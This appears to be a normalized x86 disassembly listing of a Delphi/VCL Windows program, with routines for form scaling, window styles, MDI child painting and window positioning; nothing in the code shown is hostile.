cmp [ eax + 0x270 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
test eax eax
jle r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_439d68
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
mov [ eax + 0x98 ] dl
test bl bl
jne r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_439dac
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x25c ] eax
mov eax [ ebp - 0x4 ]
call sub_453374
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
cmp esi eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_43b4f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453249
mov eax [ ebp - 0x4 ]
call sub_43d3c8
retn
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_45264c
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_4405ec
mov bl 0x1
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45264c
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4405ec
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x68 ]
mov eax esi
call sub_41ce08
push eax
call MulDiv
mov edx eax
mov eax esi
call sub_41ce10
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x268 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_453251
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43de68
push 0x0
push 0x0
push ebx
push sub_453358
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_453324
push ebx
push sub_45333c
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
retn
sub_453303
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_417170
test al al
je r-xdata
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_43a478
sub_45338f
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add bl al
lea eax [ eax ]
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_45264c
mov ecx edi
mov edx esi
mov eax ebx
call sub_4405ec
mov eax ebx
call sub_453478
test al al
je r-xdata
push edi
push esi
mov ebp [ ebx + 0x68 ]
mov eax ebp
call sub_41ceac
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_41cec8
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_439d94
mov ebp eax
push edi
push esi
mov eax ebx
call sub_439d50
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_453720
push edi
push esi
push ebp
call MulDiv
mov edx eax
mov eax ebx
call sub_453750
sub_45341c
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_440b28
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_440e2c
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_45577c
push eax
push 0x1
push 0x80
mov eax ebx
call sub_440b28
push eax
call SendMessageA
pop ebx
retn
sub_4534b0
push ebx
mov ebx eax
mov eax ebx
call sub_4543cc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov al [ ebx + 0x229 ]
sub al 0x2
je r-xdata
mov al 0x1
sub al 0x3
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
cmp al [ ebx + 0x210 ]
jne r-xdata
sub_453544
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_440b28
push eax
call IsIconic
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_440bf0
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetRect
push 0xffffffec
mov eax ebx
call sub_440b28
push eax
call GetWindowLongA
push eax
cmp [ ebx + 0x248 ] 0x0
setne al
neg al
sbb eax eax
push eax
push 0xfffffff0
mov eax ebx
call sub_440b28
push eax
call GetWindowLongA
push eax
push esi
call AdjustWindowRectEx
mov eax [ ebx + 0x4c ]
sub eax [ esi + 0xc ]
add eax [ esi + 0x4 ]
push eax
mov eax [ ebx + 0x48 ]
sub eax [ esi + 0x8 ]
add eax [ esi ]
push eax
push 0x0
push 0x0
push esi
call SetRect
pop esi
pop ebx
retn
sub_4535cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_4410cc
cmp ebx esi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_419e78
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_419e4c
mov edi eax
mov eax edi
mov si 0xfff1
call sub_403300
test al al
jne r-xdata
sub_453638
push ebx
push esi
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax ebx
call sub_40304c
cmp esi eax
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_453664
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax [ esp ]
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov eax ebp
call sub_43d858
sub [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xffffffff
mov eax ebp
call sub_419e78
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebp
call sub_441114
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx edi
mov eax ebp
call sub_419e4c
mov si 0xfff1
call sub_403300
test al al
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_419e88
jmp r-xdata
sub_4536f8
push ebx
mov ebx eax
cmp dl [ ebx + 0x60 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_43a534
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_43b4f4
sub_453720
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_439d68
pop ebx
retn
mov [ ebx + 0x268 ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_453750
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_439dac
pop ebx
retn
mov [ ebx + 0x26c ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_453780
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi + 0x2f4 ] 0x1
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_43a26c
cmp bl [ esi + 0x57 ]
je r-xdata
and [ esi + 0x2f4 ] 0xfd
pop esi
pop ebx
retn
or [ esi + 0x2f4 ] 0x2
jmp r-xdata
mov eax esi
call sub_4548b8
pop esi
pop ebx
retn
sub_4537c4
push ebp
mov ebp esp
push 0x0
xor edx edx
push ebp
push sub_45381d
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453824
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b520
call sub_403890
sub_45382c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
je r-xdata
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_43a220
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax ebx
call sub_43e080
mov eax ebx
call sub_43e21c
sub_453864
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_419cc4
cmp [ ebx + 0x250 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x2c ]
sub_4538a4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov edx eax
cmp edx 0x46
jg r-xdata
sub edx 0xb01a
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
add edx 0xfffffffa
sub edx 0x3
jb r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43e53c
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_403300
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub edx 0x22
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb1
call sub_403300
jmp r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x7
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x1
jne r-xdata
dec edx
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb025
mov eax [ ebp - 0x4 ]
call sub_43b4f4
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax [ ebp - 0x4 ]
call sub_43b4f4
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax [ ebp - 0x4 ]
call sub_43b4f4
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax [ ebp - 0x4 ]
call sub_43b4f4
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax [ ebp - 0x4 ]
call sub_43b4f4
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_43b4f4
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x229 ]
sub al 0x2
je r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x2
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
cmp [ esi ] 0x1
jne r-xdata
jmp r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x1
jmp r-xdata
sub al 0x3
jne r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_44d9c8
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4541d0
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d544
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_453b1d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_453b00
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0xc ]
call sub_41dbbc
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_41da5c
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_44eeb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453b07
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41dbbc
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_44d9c8
mov edi eax
test edi edi
je r-xdata
test esi esi
je r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4541d0
call sub_440b28
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_440b28
push eax
call GetWindowDC
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_453c4b
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d544
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_453c24
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_453c07
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41dbbc
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_41da5c
lea eax [ esi + 0x10 ]
push eax
lea ecx [ esi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453c0e
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41dbbc
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
push esi
call SetFocus
jmp r-xdata
call sub_440b28
mov esi eax
sub_453c2b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_440b28
push eax
call ReleaseDC
retn
sub_453cdc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x274 ]
push eax
call CallWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_453d28
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_454204
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_454250
cmp [ eax + 0x22b ] 0x2
jne r-xdata
pop esi
pop ebx
pop ebp
retn
sub_453d68
push ebp
mov ebp esp
add esp 0xffffff8c
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0xf
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x5
je r-xdata
xor eax eax
push ebp
push sub_453f36
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call BeginPaint
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41d428
push eax
lea edx [ ebp - 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x2b
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43e7dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetWindowRect
lea ecx [ ebp - 0x74 ]
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_439e90
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x58 ]
neg ecx
mov edx [ ebp - 0x5c ]
neg edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_438c88
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push ebp
call sub_453cdc
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x45
jne r-xdata
retn
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call EndPaint
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetClientRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41d428
push eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
call sub_454204
test eax eax
je r-xdata
push ebp
call sub_453cdc
pop ecx
push ebp
call sub_453cdc
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov dl 0x1
push ebp
call sub_453d28
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0xffffffff
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
call sub_451048
jmp r-xdata
sub_453f48
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
mov ecx esi
mov eax ebx
call sub_452210
mov eax [ ebx + 0x254 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x14
mov ecx [ esi + 0xc ]
mov edi [ esi + 0x4 ]
sub ecx edi
push ecx
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
sub ecx edx
push ecx
push edi
push edx
push 0x1
push eax
call SetWindowPos
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
push esp
mov eax [ ebx + 0x254 ]
push eax
call GetClientRect
test eax eax
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x254 ]
push eax
call InvalidateRect
sub_453fb4
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax ebx
call sub_4528ac
mov eax ebx
call sub_440e2c
test al al
je r-xdata
mov eax ebx
call sub_419e78
mov edi eax
dec edi
test edi edi
jl r-xdata
push 0xffffffec
mov eax ebx
call sub_440b28
push eax
call GetWindowLongA
and eax 0xffffefff
and eax 0xffffdfff
and eax 0xffffbfff
mov [ esp ] eax
mov edx esp
mov eax ebx
call sub_43d94c
mov eax [ esp ]
push eax
push 0xffffffec
mov eax ebx
call sub_440b28
push eax
call SetWindowLongA
pop edx
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_419e4c
call sub_44e50c
mov edx esi
mov eax ebx
call sub_419e4c
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
sub_45404c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x1
xor edx edx
push ebp
push sub_4540c9
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
mov dl [ eax + 0x5f ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ rw-data ]
mov dl [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
sub_4540d4
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x228 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x228 ] al
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_43e0c8
sub_454100
push esi
mov esi eax
cmp dl [ esi + 0x229 ]
je r-xdata
pop esi
retn
mov eax edx
mov [ esi + 0x229 ] al
sub al 0x2
je r-xdata
mov dl 0x1
sub al 0x3
je r-xdata
mov eax esi
call sub_43e0c8
xor edx edx
jmp r-xdata
mov eax esi
call sub_45238c
test [ esi + 0x1c ] 0x10
jne r-xdata
sub_454138
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ ebx + 0x30 ]
mov esi [ ebx + 0xa0 ]
mov ecx esp
mov eax ebx
call sub_439b50
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp edi eax
jne r-xdata
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov eax ebx
call sub_43e0c8
sub_45417c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_439c5c
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov al [ ebx + 0x229 ]
mov [ ebx + 0x280 ] al
mov [ ebx + 0x229 ] 0x0
mov al [ ebx + 0x280 ]
mov [ ebx + 0x229 ] al
jmp r-xdata
sub_4541d0
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x229
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
call sub_4371d8
sub_454204
push ebx
push esi
push edi
xor edi edi
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_457d74
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc edi
mov edx esi
mov eax [ rw-data ]
call sub_457d60
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_454250
push ebx
push esi
push edi
mov edi edx
cmp [ eax + 0x22f ] 0x2
jne r-xdata
xor eax eax
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_457d74
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
dec edi
test edi edi
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_457d60
cmp [ eax + 0x22f ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_4542a0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov edx [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx eax
mov eax ebx
call sub_413c10
mov al 0x1
pop ebx
pop ebp
retn 0x10
sub_4542d0
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov ebp rw-data
xor eax eax
mov [ esp ] eax
push 0x2
mov eax ebx
call sub_440b28
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi eax
mov eax [ ebp ]
call sub_457d44
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp ]
call sub_457d44
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
push eax
mov eax sub_4542a0
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
